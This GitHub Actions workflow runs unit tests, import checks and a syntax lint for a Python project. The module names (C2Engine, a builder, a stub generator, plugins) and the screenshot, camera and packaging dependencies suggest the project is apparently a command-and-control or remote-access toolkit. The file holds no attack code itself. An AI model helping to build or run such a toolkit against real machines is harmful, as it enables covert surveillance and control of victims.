name: Test

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]

jobs:
  test-windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - name: Install dependencies
        run: pip install pyinstaller pillow mss cryptography opencv-python-headless
      - name: Clear cache
        run: Get-ChildItem -Recurse -Directory -Filter __pycache__ | Remove-Item -Recurse -Force
      - name: Run unit tests
        run: python test_units.py

  test-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - name: Run unit tests
        run: python test_units.py
      - name: Check all imports
        run: |
          python -c "
          from whisper_crypto import derive_key, encrypt_bytes, decrypt_bytes, encrypt_dict, decrypt_dict
          from whisper_config import WhisperConfig, load_config
          from whisper_protocol import encode_frame, decode_frame_header, validate_message
          from whisper_logging import setup_logger, TkinterHandler
          from server import C2Engine, MainApp
          from builder import BuilderApp
          from plugins import PLUGIN_REGISTRY
          from stub_generator import generate_stub
          print('All imports OK')
          "

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - name: Syntax check all Python files
        run: |
          import os, glob, py_compile, sys
          errors = 0
          for root, dirs, files in os.walk('.'):
              for f in files:
                  if f.endswith('.py'):
                      path = os.path.join(root, f)
                      try:
                          py_compile.compile(path, doraise=True)
                      except py_compile.PyCompileError as e:
                          print(f'ERROR: {path}: {e}')
                          errors += 1
          if errors:
              print(f'{errors} files failed')
              sys.exit(1)
          print('All files OK')
        shell: python {0}
